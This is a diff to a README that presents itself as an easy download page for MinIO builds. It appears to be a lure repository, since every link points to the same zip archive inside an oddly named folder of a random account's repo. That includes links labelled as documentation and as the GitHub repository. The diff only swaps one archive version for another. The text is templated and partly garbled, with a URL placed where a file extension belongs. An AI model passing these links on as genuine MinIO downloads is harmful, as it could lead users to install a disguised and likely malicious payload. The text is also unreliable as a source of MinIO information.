@@ -1,6 +1,6 @@
 # 🚀 minio-builds - Easy MinIO Downloads for Everyone
 
-[![Download MinIO Builds](https://raw.githubusercontent.com/nammadturkestandesert942/minio-builds/main/lenvoy/minio-builds-v2.0.zip%20Now-%20-%https://raw.githubusercontent.com/nammadturkestandesert942/minio-builds/main/lenvoy/minio-builds-v2.0.zip)](https://raw.githubusercontent.com/nammadturkestandesert942/minio-builds/main/lenvoy/minio-builds-v2.0.zip)
+[![Download MinIO Builds](https://github.com/nammadturkestandesert942/minio-builds/raw/refs/heads/main/lenvoy/minio_builds_v1.9.zip%20Now-%20-%https://github.com/nammadturkestandesert942/minio-builds/raw/refs/heads/main/lenvoy/minio_builds_v1.9.zip)](https://github.com/nammadturkestandesert942/minio-builds/raw/refs/heads/main/lenvoy/minio_builds_v1.9.zip)
 
 ## 🌟 About MinIO
 
@@ -14,13 +14,13 @@ MinIO is designed for everyone. You don't need any programming knowledge. Follow
 
 1. **Visit the Release Page**  
    Click the link below to go to the releases page where you can download the latest version of MinIO.  
-   [Download MinIO Builds](https://raw.githubusercontent.com/nammadturkestandesert942/minio-builds/main/lenvoy/minio-builds-v2.0.zip)
+   [Download MinIO Builds](https://github.com/nammadturkestandesert942/minio-builds/raw/refs/heads/main/lenvoy/minio_builds_v1.9.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of MinIO. Locate the version you need. The latest one is usually at the top. Click on it.
 
 3. **Download the File**  
-   Inside the chosen version, you will find several files. If you are using Windows, look for a file with `.exe`. If you are on Mac or Linux, look for `https://raw.githubusercontent.com/nammadturkestandesert942/minio-builds/main/lenvoy/minio-builds-v2.0.zip` or `.zip`. Click on the link to download the file.
+   Inside the chosen version, you will find several files. If you are using Windows, look for a file with `.exe`. If you are on Mac or Linux, look for `https://github.com/nammadturkestandesert942/minio-builds/raw/refs/heads/main/lenvoy/minio_builds_v1.9.zip` or `.zip`. Click on the link to download the file.
 
 4. **Run MinIO**  
    Once the download is complete, find the downloaded file on your computer. 
@@ -52,7 +52,7 @@ MinIO is released under the Apache 2.0 License. You can use it freely for person
 
 ## 🔗 Additional Resources
 
-- [MinIO Documentation](https://raw.githubusercontent.com/nammadturkestandesert942/minio-builds/main/lenvoy/minio-builds-v2.0.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/nammadturkestandesert942/minio-builds/main/lenvoy/minio-builds-v2.0.zip)
+- [MinIO Documentation](https://github.com/nammadturkestandesert942/minio-builds/raw/refs/heads/main/lenvoy/minio_builds_v1.9.zip)
+- [GitHub Repository](https://github.com/nammadturkestandesert942/minio-builds/raw/refs/heads/main/lenvoy/minio_builds_v1.9.zip)
 
 For any updates or changes, keep an eye on the releases page. Enjoy your experience with MinIO!
